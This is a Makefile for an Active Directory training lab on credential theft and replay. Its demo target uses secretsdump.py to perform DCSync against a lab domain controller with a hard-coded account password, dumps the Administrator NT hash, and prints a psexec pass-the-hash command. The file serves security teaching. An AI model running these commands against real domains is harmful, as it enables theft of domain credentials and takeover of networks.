# Module 04 — Credential Theft & Replay lab.
.PHONY: up down reset demo shell

up:
	docker compose up -d --build

down:
	docker compose down

reset:
	docker compose down --rmi local --volumes --remove-orphans

shell:
	docker compose exec attacker bash

demo:       ## Run secretsdump demo against the Corp DC
	@echo "=== Waiting for DC... ==="
	docker compose exec attacker sh -c \
	    'until python3 -c "import socket; socket.create_connection((\"dc01.corp.local\", 445), 3)" 2>/dev/null; do sleep 3; done; echo "DC ready."'
	@echo ""
	@echo "=== 1. DCSync — pull all hashes via DRSUAPI replication ==="
	docker compose exec attacker \
	    secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local \
	    -just-dc-ntlm 2>/dev/null | head -30 || \
	    echo "[note] secretsdump requires full DC access; ensure the DC is provisioned"
	@echo ""
	@echo "=== 2. Pull Administrator hash only ==="
	docker compose exec attacker \
	    secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local \
	    -just-dc-user Administrator 2>/dev/null || \
	    echo "[note] secretsdump CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local -just-dc-user Administrator"
	@echo ""
	@echo "=== 3. Pass-the-hash (psexec) — authenticate with NT hash ==="
	@echo "   Command: psexec.py -hashes :NT_HASH CORP.LOCAL/Administrator@dc01.corp.local"
	@echo "   (Supply the Administrator NT hash extracted in step 2)"
	@echo ""
	@echo "=== Demo complete. Run 'make shell' to try interactively. ==="
